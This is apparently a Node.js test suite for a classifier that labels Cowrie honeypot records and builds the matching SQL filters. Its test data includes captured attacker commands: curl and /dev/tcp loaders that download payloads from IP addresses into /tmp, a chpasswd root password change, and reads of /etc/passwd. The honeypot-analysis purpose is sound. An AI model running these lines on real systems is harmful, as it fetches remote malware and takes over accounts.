const test = require('node:test');
const assert = require('node:assert');
const { createHash } = require('node:crypto');
const {
  RECORD_CLASSES, BINARY_FRAGMENT_SHA256, LOG_ARTIFACT_PREFIXES,
  classifyCommand, classFilterSql, parseClassParam, recordClassSql,
} = require('../lib/record-class');

const sha = (s) => createHash('sha256').update(s, 'utf8').digest('hex');

/**
 * The cost of the two failure directions is not symmetric.
 *
 * Misclassifying an artifact as a command puts a Cowrie log line on the public
 * leaderboard, which is embarrassing and immediately visible — it happened for
 * 25 minutes after the Phase 0 backfill. Misclassifying a command as an
 * artifact hides it from every endpoint by default, silently and permanently.
 * The second is what these tests mostly guard.
 */

test('real commands classify as commands', () => {
  for (const c of ['uname -a', 'cat /etc/passwd', 'crontab -l', 'wget http://1.2.3.4/x',
                   'echo root:modzmodz | chpasswd', 'cd ~; chattr -ia .ssh']) {
    assert.strictEqual(classifyCommand(c), 'command', `misclassified: ${c}`);
  }
});

test('the /dev/tcp C2 loaders are commands, not binary fragments', () => {
  // The whole reason binary_fragment is an explicit hash list. A `%UPX!%` or
  // `%ELF%` substring rule matches 12 rows in the corpus and 6 of them are
  // these — the most valuable family in the dataset, and exactly what Phase 4
  // exists to mine. Classifying them as garbage would hide them by default.
  const loaders = [
    'nohup $SHELL -c "curl http://8.140.193.241:60104/linux -o /tmp/jZGdqaaxIZ; ' +
      'if [ ! -f /tmp/jZGdqaaxIZ ]; then echo UPX! compressed payload; fi"',
    'nohup bash -c "exec 6<>/dev/tcp/163.192.12.237/60106 && echo -n \'GET /linux\' >&6 ' +
      '&& cat 0<&6 > /tmp/Kx9; head -c 1234 ELF"',
  ];
  for (const c of loaders) {
    assert.strictEqual(classifyCommand(c, sha(c)), 'command',
      'a loader whose payload text mentions ELF/UPX is still a command');
  }
});

test('the five known binary fragments classify by hash', () => {
  assert.strictEqual(BINARY_FRAGMENT_SHA256.length, 5);
  assert.strictEqual(classifyCommand('>ELF', sha('>ELF')), 'binary_fragment');
  assert.strictEqual(classifyCommand('cat /bin/echoQtd#UPX!', sha('cat /bin/echoQtd#UPX!')),
    'binary_fragment');
  // Every listed hash is a real lowercase sha256.
  for (const h of BINARY_FRAGMENT_SHA256) assert.match(h, /^[0-9a-f]{64}$/);
});

test('without a hash a binary fragment falls back to command, not to garbage', () => {
  // The fail-safe direction: an unhashed lookup must not silently hide a row.
  assert.strictEqual(classifyCommand('>ELF'), 'command');
});

test('cowrie log messages classify as log_artifact', () => {
  for (const c of ['New connection: 1.2.3.4:5678 (192.168.50.10:22) [session: abc]',
                   'Remote SSH version: SSH-2.0-Go',
                   'login attempt [root/123456] failed',
                   'public key attempt for user root with fp aa:bb',
                   'Attempt to download file(s) from URL http://1.2.3.4/x',
                   '{}', '[]', '?', '']) {
    assert.strictEqual(classifyCommand(c), 'log_artifact', `not caught: ${c}`);
  }
});

test('the honeypot prompt echo is its own class', () => {
  // Two rows, differing only by a trailing space, 1,116 events between them.
  assert.strictEqual(classifyCommand('Enter new UNIX password:'), 'prompt_echo');
  assert.strictEqual(classifyCommand('Enter new UNIX password: '), 'prompt_echo');
});

test('cat /etc/passwd is not mistaken for the password prompt', () => {
  assert.strictEqual(classifyCommand('cat /etc/passwd'), 'command');
});

test('a prefix is a prefix, not a substring', () => {
  // `echo "New connection: established"` is something an attacker could type.
  // Matching the marker anywhere in the text would hide it.
  assert.strictEqual(classifyCommand('echo "New connection: established"'), 'command');
  assert.strictEqual(classifyCommand('grep "login attempt [" /var/log/auth.log'), 'command');
});

test('degenerate input never throws and never invents a class', () => {
  for (const c of [null, undefined, 42, {}]) {
    assert.strictEqual(classifyCommand(c), 'unknown');
  }
  assert.ok(RECORD_CLASSES.includes('unknown'));
});

// ---------------------------------------------------------------------------
// The SQL side must encode the same decision
// ---------------------------------------------------------------------------

test('recordClassSql covers every prefix the JS classifier knows', () => {
  const sql = recordClassSql('command', 'command_sha256');
  for (const p of LOG_ARTIFACT_PREFIXES) {
    assert.ok(sql.includes(`'${p.replace(/'/g, "''")}%'`), `SQL is missing prefix: ${p}`);
  }
  for (const h of BINARY_FRAGMENT_SHA256) assert.ok(sql.includes(h), `SQL is missing hash: ${h}`);
  assert.ok(sql.endsWith('::cowrie_record_class'));
});

test('recordClassSql orders binary before artifact before command', () => {
  const sql = recordClassSql();
  assert.ok(sql.indexOf('binary_fragment') < sql.indexOf('prompt_echo'));
  assert.ok(sql.indexOf('prompt_echo') < sql.indexOf('log_artifact'));
  assert.ok(sql.indexOf('log_artifact') < sql.lastIndexOf("'command'"));
});

test('single quotes in a prefix cannot break out of the generated SQL', () => {
  // None of the current prefixes contain one, which is exactly why a future
  // addition would be the thing that breaks it.
  const sql = recordClassSql();
  const quotes = (sql.match(/'/g) || []).length;
  assert.strictEqual(quotes % 2, 0, 'unbalanced quotes in generated SQL');
});

// ---------------------------------------------------------------------------
// The filter endpoints apply
// ---------------------------------------------------------------------------

test('the filter defaults to commands and rejects junk', () => {
  assert.strictEqual(classFilterSql(undefined), "record_class = 'command'");
  assert.strictEqual(classFilterSql('nonsense'), "record_class = 'command'");
  assert.strictEqual(classFilterSql("'; DROP TABLE --"), "record_class = 'command'");
});

test('?class=all opts out and a named class opts into exactly that one', () => {
  assert.strictEqual(classFilterSql('all'), 'TRUE');
  assert.strictEqual(classFilterSql('log_artifact'), "record_class = 'log_artifact'");
});

test('parseClassParam only ever yields a value the filter accepts', () => {
  for (const raw of ['all', 'command', 'log_artifact', 'bogus', undefined, null, 12]) {
    const parsed = parseClassParam(raw);
    assert.ok(parsed === 'all' || RECORD_CLASSES.includes(parsed), `bad parse of ${raw}`);
  }
});

// ---------------------------------------------------------------------------
// The two-step rollout runs both predicates at once
// ---------------------------------------------------------------------------

test('realCommandSql and classifyCommand agree about what a command is', () => {
  // While record_class is being backfilled, the endpoints use the text
  // predicate and the ingest path uses the classifier. If they disagreed, the
  // switchover would silently change what the public API returns.
  const { realCommandSql } = require('../lib/record-class');
  const sql = realCommandSql('command');

  // Everything the classifier calls an artifact must appear as an exclusion.
  for (const p of LOG_ARTIFACT_PREFIXES) {
    assert.ok(sql.includes(`NOT LIKE '${p.replace(/'/g, "''")}%'`), `text predicate misses: ${p}`);
  }
  // Including the prompt echo, which is its own class but is equally not a
  // command — the earlier version of this predicate listed it by hand, and
  // splitting the lists is exactly how the two would drift apart.
  assert.ok(sql.includes("NOT LIKE 'Enter new UNIX password:%'"));
  assert.ok(sql.includes("<> '{}'") && sql.includes("<> '[]'"));
});

test('the text predicate is built from the same lists, not a second copy', () => {
  const { realCommandSql, LOG_ARTIFACT_PREFIXES: prefixes } = require('../lib/record-class');
  const clauses = realCommandSql('command').split(' AND ').length;
  // prefixes + prompt echo + the exact values. A hand-maintained duplicate
  // would drift from this count the first time either list changed.
  assert.strictEqual(clauses, prefixes.length + 1 + 4);
});
